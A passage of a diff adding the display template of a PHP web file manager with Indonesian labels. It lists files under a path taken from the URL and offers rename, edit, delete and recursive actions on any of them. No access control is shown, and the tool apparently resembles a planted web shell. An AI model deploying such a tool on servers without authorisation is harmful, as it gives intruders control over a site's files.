+            <div><span class="badge"><i class="fas fa-info-circle"></i> Centang folder untuk recursive ops</span></div>
+        </div>
+
+        <form method="post" id="mainForm">
+            <table class="file-table">
+                <thead>
+                    <tr>
+                        <th style="width: 30px;"><input type="checkbox" id="selectAll"></th>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Perm</th>
+                        <th>Modified</th>
+                        <th>Rename</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php foreach ($items as $item):
+                        $full = $item['fullpath'];
+                        $name = $item['name'];
+                        $isDir = is_dir($full);
+                        $perm = substr(sprintf('%o', fileperms($full)), -4);
+                        $size = $isDir ? '📁' : number_format(filesize($full));
+                        $mtime = date('Y-m-d H:i:s', filemtime($full));
+                    ?>
+                    <tr>
+                        <td><input type="checkbox" name="<?php echo $isDir ? 'dir_targets[]' : 'file_targets[]'; ?>" value="<?php echo htmlspecialchars($full); ?>"></td>
+                        <td>
+                            <?php if ($isDir): ?>
+                                <a href="?pwd=<?php echo urlencode($full); ?>" class="folder-link"><i class="fas fa-folder"></i> <?php echo htmlspecialchars($name); ?>/</a>
+                            <?php else: ?>
+                                <i class="fas fa-file"></i> <?php echo htmlspecialchars($name); ?>
+                            <?php endif; ?>
+                        </td>
+                        <td><?php echo $size; ?></td>
+                        <td><?php echo $perm; ?></td>
+                        <td><?php echo $mtime; ?></td>
+                        <td>
+                            <?php if (!$isDir): ?>
+                                <input type="text" name="rename_val[<?php echo htmlspecialchars($name); ?>]" value="<?php echo htmlspecialchars($name); ?>" style="width: 120px; padding: 4px 8px;">
+                            <?php else: ?>
+                                <input type="text" name="rename_dir_val[<?php echo htmlspecialchars($name); ?>]" value="<?php echo htmlspecialchars($name); ?>" style="width: 120px; padding: 4px 8px;">
+                                <button type="submit" name="action" value="rename_dir_one:<?php echo htmlspecialchars($full); ?>|" class="btn" style="padding: 2px 8px;">Rename</button>
+                            <?php endif; ?>
+                        </td>
+                        <td>
+                            <?php if (!$isDir): ?>
+                                <a href="?pwd=<?php echo urlencode($pwd); ?>&edit=<?php echo urlencode($name); ?>" class="btn" style="padding: 4px 10px;">✏️ Edit</a>
+                                <button type="submit" name="action" value="delete_one:<?php echo htmlspecialchars($name); ?>" class="btn btn-danger" style="padding: 4px 8px;" onclick="return confirm('Delete?')">🗑️</button>
+                            <?php else: ?>
+                                <span class="badge">dir</span>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </form>
+    </div>
+
+    <!-- Editor Panel -->
+    <?php if ($editFile && $editContent !== ''): ?>
+    <div class="card">
+        <div class="card-title"><i class="fas fa-edit"></i> EDITING: <?php echo htmlspecialchars($editFile); ?></div>
+        <form method="post">
+            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editFile); ?>">
+            <textarea name="file_content" rows="12" style="width: 100%; font-family: monospace; margin: 16px 0;"><?php echo htmlspecialchars($editContent); ?></textarea>
+            <button type="submit" name="action" value="edit_save" class="btn btn-primary"><i class="fas fa-save"></i> Save Changes</button>
+        </form>
+    </div>
+    <?php endif; ?>
+
+    <!-- Messages -->
+    <?php if (!empty($messages)): ?>
+    <div class="card" style="border-left: 3px solid #38bdf8;">
+        <?php foreach ($messages as $msg): ?>
+            <div style="font-size: 12px; padding: 4px 0;"><?php echo htmlspecialchars($msg); ?></div>
+        <?php endforeach; ?>
+    </div>
+    <?php endif; ?>
+</div>
+
+<script>
+function togglePanel(id) {
+    const el = document.getElementById(id);
+    if (el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
+}
+document.getElementById('selectAll')?.addEventListener('change', function(e) {
+    document.querySelectorAll('#mainForm input[type="checkbox"]').forEach(cb => cb.checked = e.target.checked);
+});
+</script>
+</body>
+</html>
